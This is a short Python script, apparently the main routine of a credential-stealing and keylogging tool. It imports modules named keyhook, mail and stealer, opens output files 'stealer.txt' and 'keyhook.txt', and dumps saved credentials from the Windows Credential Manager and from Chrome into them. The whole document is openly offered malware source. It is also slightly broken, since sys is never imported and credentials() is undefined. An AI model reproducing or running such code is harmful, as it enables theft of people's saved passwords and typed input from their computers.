#!/usr/bin/python

import keyhook
import mail
import stealer



if __name__ == "__main__":
    try:
        st = open("stealer.txt","a")
        ky = open("keyhook.txt","a")
    except Exception as e:
        print("open files failed")
        sys.exit(1)

    stealer =  credentials()
    try:
        st.write(stealer.dump_credsman_generic())
        st.write(stealer.dump_chrome_credentials())
    except Exception as e:
        print("error dumping content")
        sys.exit(1)
